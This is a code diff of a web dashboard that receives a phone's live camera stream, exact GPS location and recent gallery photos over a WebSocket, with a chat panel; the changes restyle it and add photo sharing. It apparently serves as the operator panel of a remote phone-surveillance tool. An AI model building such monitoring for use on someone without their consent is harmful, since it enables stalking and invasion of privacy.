@@ -3,97 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Control & Monitoring Dashboard</title>
+    <title>Advanced Live Monitor Dashboard</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0f19; color: #f8fafc; margin: 0; padding: 20px; }
         .container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 1400px; margin: auto; }
-        .card { background: #1e293b; padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-        h2 { margin-top: 0; color: #38bdf8; font-size: 1.2rem; border-bottom: 1px solid #334155; padding-bottom: 10px; }
+        .card { background: #1e293b; padding: 20px; border-radius: 14px; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
+        h2 { margin-top: 0; color: #38bdf8; font-size: 1.1rem; border-bottom: 1px solid #334155; padding-bottom: 10px; }
         
-        /* Camera & Map */
-        #camFeed { width: 100%; height: 250px; background: #000; border-radius: 8px; object-fit: cover; }
-        .coords-box { font-family: monospace; background: #0f172a; padding: 10px; border-radius: 6px; margin-top: 10px; color: #4ade80; }
+        #camFeed { width: 100%; height: 260px; background: #000; border-radius: 10px; object-fit: cover; }
+        .coords-box { font-family: monospace; background: #0f172a; padding: 12px; border-radius: 8px; margin-top: 10px; color: #4ade80; font-size: 1rem; }
 
-        /* Gallery Grid */
-        .gallery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-height: 250px; overflow-y: auto; }
-        .gallery-grid img { width: 100%; height: 80px; object-fit: cover; border-radius: 6px; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; max-height: 280px; overflow-y: auto; padding-right: 5px; }
+        .gallery-grid img { width: 100%; height: 90px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 2px solid transparent; transition: 0.2s; }
+        .gallery-grid img:hover { border-color: #38bdf8; transform: scale(1.03); }
 
-        /* Chat Section */
-        .chat-box { height: 200px; overflow-y: auto; background: #0f172a; padding: 10px; border-radius: 6px; margin-bottom: 10px; display: flex; flexDirection: column; }
-        .msg { margin-bottom: 8px; padding: 6px 10px; border-radius: 6px; max-width: 80%; }
+        .chat-section { grid-column: span 2; display: flex; flex-direction: column; height: 350px; }
+        .chat-box { flex: 1; overflow-y: auto; background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 8px; }
+        .msg { padding: 10px 14px; border-radius: 10px; max-width: 70%; word-break: break-word; }
         .msg.phone { background: #334155; align-self: flex-start; }
         .msg.web { background: #0284c7; align-self: flex-end; }
+        .msg img { max-width: 200px; border-radius: 8px; display: block; margin-top: 5px; cursor: pointer; }
         .chat-input-row { display: flex; gap: 10px; }
-        .chat-input-row input { flex: 1; padding: 10px; border-radius: 6px; border: none; background: #334155; color: #fff; }
-        .chat-input-row button { padding: 10px 20px; background: #0284c7; border: none; color: #fff; border-radius: 6px; cursor: pointer; }
+        .chat-input-row input { flex: 1; padding: 12px; border-radius: 8px; border: none; background: #334155; color: #fff; font-size: 1rem; }
+        .chat-input-row button { padding: 12px 24px; background: #0284c7; border: none; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h1 style="text-align: center; margin-bottom: 30px;">📱 Live Phone Monitor Dashboard</h1>
+    <h1 style="text-align: center; margin-bottom: 30px; color: #f1f5f9;">🛡️ Real-Time Remote Monitoring Dashboard</h1>
 
     <div class="container">
-        <!-- Live Camera Stream -->
         <div class="card">
-            <h2>Live Camera Stream</h2>
-            <img id="camFeed" alt="Waiting for camera stream..." />
+            <h2>Live Video Stream (Continuous)</h2>
+            <img id="camFeed" alt="Connecting to live stream..." />
         </div>
 
-        <!-- GPS Coordinates -->
         <div class="card">
             <h2>Exact GPS Coordinates</h2>
-            <div class="coords-box" id="coordsText">Fetching location...</div>
-            <p style="font-size: 0.85rem; color: #94a3b8; margin-top: 10px;">Updates live from phone sensors.</p>
+            <div class="coords-box" id="coordsText">Waiting for location fix...</div>
+            <p style="font-size: 0.85rem; color: #94a3b8; margin-top: 15px;">Real-time tracking active.</p>
         </div>
 
-        <!-- Gallery Sync -->
         <div class="card" style="grid-column: span 2;">
-            <h2>Synced Gallery Photos</h2>
+            <h2>Synced Gallery (Last 5 Days Photos - Click to send in chat)</h2>
             <div class="gallery-grid" id="galleryContainer">
-                <p style="color: #94a3b8; grid-column: span 3; text-align: center;">No photos synced yet.</p>
+                <p style="color: #94a3b8; grid-column: span 4; text-align: center;">Fetching phone gallery...</p>
             </div>
         </div>
 
-        <!-- Chat Panel -->
-        <div class="card" style="grid-column: span 2;">
-            <h2>Real-time Chat</h2>
+        <div class="card chat-section">
+            <h2>Comfortable Chat & Media Sharing</h2>
             <div class="chat-box" id="chatMessages"></div>
             <div class="chat-input-row">
-                <input type="text" id="msgInput" placeholder="Type a reply to phone..." />
+                <input type="text" id="msgInput" placeholder="Type a message or click photo from gallery..." onkeypress="handleKeyPress(event)" />
                 <button onclick="sendMessage()">Send</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Render WebSocket URL (Apna live Render URL yahan dalein)
         const ws = new WebSocket('wss://liveapp-uo4s.onrender.com');
 
         ws.onmessage = (event) => {
             const data = JSON.parse(event.data);
 
-            // 1. Camera Stream Handle
-            if (data.type === 'CAMERA_FRAME') {
+            if (data.type === 'LIVE_FRAME') {
                 document.getElementById('camFeed').src = data.image;
             }
 
-            // 2. GPS Coordinates Handle
             if (data.type === 'LOCATION') {
                 document.getElementById('coordsText').innerHTML = `Latitude: ${data.lat} <br>Longitude: ${data.lng}`;
             }
 
-            // 3. Gallery Sync Handle
-            if (data.type === 'GALLERY_PHOTO') {
+            if (data.type === 'GALLERY_SYNC') {
                 const container = document.getElementById('galleryContainer');
-                if(container.innerHTML.includes('No photos')) container.innerHTML = '';
-                const img = document.createElement('img');
-                img.src = data.image;
-                container.prepend(img);
+                container.innerHTML = '';
+                data.photos.forEach(photoUri => {
+                    const img = document.createElement('img');
+                    img.src = photoUri;
+                    img.onclick = () => sendMediaMessage(photoUri);
+                    container.appendChild(img);
+                });
             }
 
-            // 4. Chat Message Handle
             if (data.type === 'CHAT') {
-                appendMessage(data.text, data.sender === 'phone' ? 'phone' : 'web');
+                appendMessage(data.text, data.sender === 'phone' ? 'phone' : 'web', data.isImage);
             }
         };
 
@@ -101,17 +95,35 @@
             const input = document.getElementById('msgInput');
             if (!input.value.trim()) return;
             
-            const messageData = { type: 'CHAT', sender: 'web', text: input.value };
+            const messageData = { type: 'CHAT', sender: 'web', text: input.value, isImage: false };
             ws.send(JSON.stringify(messageData));
-            appendMessage(input.value, 'web');
+            appendMessage(input.value, 'web', false);
             input.value = '';
         }
 
-        function appendMessage(text, sender) {
+        function sendMediaMessage(imageUri) {
+            const messageData = { type: 'CHAT', sender: 'web', text: imageUri, isImage: true };
+            ws.send(JSON.stringify(messageData));
+            appendMessage(imageUri, 'web', true);
+        }
+
+        function handleKeyPress(e) {
+            if (e.key === 'Enter') sendMessage();
+        }
+
+        function appendMessage(content, sender, isImage) {
             const chatBox = document.getElementById('chatMessages');
             const div = document.createElement('div');
             div.className = `msg ${sender}`;
-            div.innerText = text;
+            
+            if (isImage) {
+                const img = document.createElement('img');
+                img.src = content;
+                div.appendChild(img);
+            } else {
+                div.innerText = content;
+            }
+            
             chatBox.appendChild(div);
             chatBox.scrollTop = chatBox.scrollHeight;
         }
